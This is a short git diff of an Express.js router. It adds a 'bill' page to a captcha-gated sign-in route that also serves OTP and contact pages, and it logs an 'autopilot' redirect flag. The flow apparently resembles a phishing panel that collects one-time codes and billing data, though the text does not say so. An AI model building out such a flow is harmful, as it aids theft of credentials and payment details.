@@ -30,6 +30,7 @@ router.get('/sign-in', requireCap, (req, res, next) => {
   const pages = {
     otp: 'otp.html',
     contact: 'contact.html',
+    bill: 'bill.html',
   };
 
   const page = pages[action] || 'index.html';
@@ -265,7 +266,7 @@ router.get("/logout", (req, res) => {
     } */
 
     	const response = { success: true };
-
+		console.log("autopilot:", autopilot);
 		if (autopilot && nextPage) {
 		  response.link = nextPage;
 		}
